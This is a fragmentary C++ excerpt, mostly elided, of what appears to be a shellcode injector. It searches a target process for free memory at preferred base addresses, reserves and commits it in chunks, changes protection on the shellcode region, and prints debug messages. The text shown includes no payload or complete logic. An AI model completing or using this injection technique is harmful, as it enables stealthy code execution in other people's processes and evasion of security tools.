...
int main()
{
    ...
    cout << "[*] Checking for Suitable Address " << tpid << "\n";
    ...
    for (auto base : VC_PREF_BASES) {
        ...
        {
            cout << "\t\t[*] Page Attribute: MEM_FREE" << " -> " << mbi.State << "\n"; //DEBUGGING
            uint64_t i;
            for (i = 0; i < cVmResv; ++i) {
    ...
    for (i = 0; i < cVmResv; ++i)
    {
        for (cmm_i = 0; cmm_i < cVmCmm; ++cmm_i)
        {
            ...
            cout << "[*] Changed Memory Protection At Shellcode to Memory at: " << &currentVmBase << "\n";
    ...
    // ----------------------------------------------------
    cout << "INSIDE PREPENTRY\n\n\n";
    unsigned char* b = (unsigned char*)&vmBaseAddress;
